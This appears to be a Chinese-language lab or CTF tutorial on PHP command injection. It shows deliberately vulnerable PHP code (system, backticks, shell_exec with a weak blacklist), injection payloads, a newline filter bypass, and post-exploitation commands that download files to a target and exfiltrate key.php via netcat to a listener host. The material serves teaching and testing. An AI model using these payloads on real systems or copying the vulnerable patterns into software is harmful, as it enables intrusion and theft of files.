
# 3.5、命令执行

高危函数：system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open()、system()—执行shell命令也就是向dos发送一条指令。

shell_exec()—通过shell环境执行命令，并且将完整的输出以字符串的方式返回。

exec()—执行外部程序

passthru()—执行外部程序并且显示原始输出系统命令。

通过|、&、||起到命令连接的作用，利用输入时的合理构造可以使想要执行的命令和原本命令连接执行。

## system()

```
System.php
<?php
error_reporting(0);
show_source(__FILE__);

$dir = $_GET["dir"];
if(isset($dir))
{
    echo "<pre>";
    system("net user ".$dir);  //漏洞函数
    echo "</pre>";
}
?>
```
Payload:
```
http://localhost/system.php?dir=|whoami
```

## backquote

shell_exec() 命令行实际上仅是反撇号 ` 操作符的变体

```
backquote.php
<?php 
error_reporting(0);
show_source(__FILE__);

$a=$_GET['a'];
echo `$a`;  //反引号被解析
```
Payload：
```
http://localhost/learn/fan.php?a=ls
```

## shell_exec()

```
shell_exec.php
<?php
if(isset($_REQUEST[ 'ip' ])) {
    $target = trim($_REQUEST[ 'ip' ]);
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '|' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
        echo $target;
    echo  "<pre>{$cmd}</pre>";
}
show_source(__FILE__);
```

Payload:

```
http://localhost/system.php?dir=|whoami
```

## **绕过方法**

当过滤了特殊符号，可以用换行符号的方法绕过继续执行命令。换行测试方法 %0a

```
http://localhost/ping/index.php?ip=127.0.0.1%0Acat index.php
```

- rce过滤函数

```
<?php

function filter($cmd)
{
	$cmdarrays = array("cat", "less", "more","tac","head","tail","od","cp","mv","nl","vi","vim");
	
	foreach ($cmdarrays as &$value )
	{
		if  (stristr($cmd, $value))
		{
			return false;
		}
	}
	return true;
}

function filterip($ip)
{
	if(filter_var($ip, FILTER_VALIDATE_IP))
	 {
         return true;
     }

     return false;
      
}
	
?>


rce.php

<?php 
  $cmd = $_POST["cmd"];

  if (filter($cmd) || filterip($cmd) || empty($cmd))
  {
  	echo system("ping -c 1 $cmd"); 
  }
  else
  {
  	 echo "你输入的命令包含敏感字符！请检查命令是否填写正确！";
  }
?>
```



- 查看文件

```
1、查看文件内容：
   cat    [file]
   tac    [file]
   more   [file]
   less   [file]
   head   [file]
   tail   [file]
2、改变key.php的文件后缀
    mv 1.php 1.txt
    cp 1.php 1.txt
    tar: tar -cf 打包后的文件名 打包文件名
3、文件处理：
   grep '关键字' [file_path] 
   awk '{print $0}' [file_path]
4、查看命令是否存在：
   which ls
5、下载命令：
   本地机器：Python -m SimpleHTTPServer
   目标机器 curl -o linux.php http://www.linux.com/text.php
           wget -O 保存的文件名.zip http://www.test.net/download.aspx
6、过滤cat，那么尝试通过管道命令利用NC发送文件。
   本机执行：nc -lvv -p 4444
   远程机器执行：nc 172.168.0.27 4444 < ../key.php
```
